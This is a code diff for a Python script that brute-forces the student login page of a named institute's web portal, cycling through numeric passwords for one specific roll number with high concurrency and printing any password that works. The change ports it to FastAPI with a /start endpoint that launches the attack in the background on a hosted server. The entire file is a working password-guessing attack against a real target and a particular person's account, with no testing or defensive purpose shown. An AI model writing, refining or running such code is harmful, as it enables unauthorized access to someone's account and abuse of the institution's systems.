@@ -1,44 +1,53 @@
+from fastapi import FastAPI
 import asyncio
 import aiohttp
-from aiohttp import web
+
+app = FastAPI()
 
 URL = "https://app.biomeinstitute.in/weblogin/"
 ROLL = "25002833"
-START = 350000
-END = 999999
-CONCURRENCY = 200
+THREADS = 100  # Adjust for speed vs stability
 
-async def attempt_password(session, password):
-    data = {
+
+async def try_password(session, password):
+    payload = {
         "sublogin": "1",
         "username": ROLL,
         "password": str(password),
         "Login": "Secure Login"
     }
-    async with session.post(URL, data=data) as response:
+    headers = {"Content-Type": "application/x-www-form-urlencoded"}
+
+    async with session.post(URL, data=payload, headers=headers) as response:
         text = await response.text()
         if "Invalid your username and password" not in text:
-            print(f"\nSUCCESS! Roll: {ROLL} Password: {password}")
+            print("\n===========================================")
+            print(f"SUCCESS! Roll: {ROLL}  Password: {password}")
+            print("===========================================\n")
             return True
     return False
 
-async def bruteforce():
+
+async def main_bruteforce():
     async with aiohttp.ClientSession() as session:
-        semaphore = asyncio.Semaphore(CONCURRENCY)
-        async def bound_attempt(password):
-            async with semaphore:
-                return await attempt_password(session, password)
-        tasks = [bound_attempt(p) for p in range(START, END + 1)]
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        print("Finished brute force attempts.")
+        tasks = []
+        for password in range(350000, 999999):
+            task = asyncio.create_task(try_password(session, password))
+            tasks.append(task)
 
-async def handle(request):
-    return web.Response(text="Service is running.\n")
+            if len(tasks) >= THREADS:
+                results = await asyncio.gather(*tasks)
+                if any(results):
+                    break
+                tasks.clear()
 
-app = web.Application()
-app.router.add_get("/", handle)
 
-if __name__ == "__main__":
-    loop = asyncio.get_event_loop()
-    loop.create_task(bruteforce())  # Start brute force as background task
-    web.run_app(app, port=10000)  # Bind to port (Render expects this)
+@app.get("/")
+async def root():
+    return {"status": "Service is live. Go to /start to begin brute force."}
+
+
+@app.get("/start")
+async def start_task():
+    asyncio.create_task(main_bruteforce())
+    return {"status": "Brute force started in background!"}
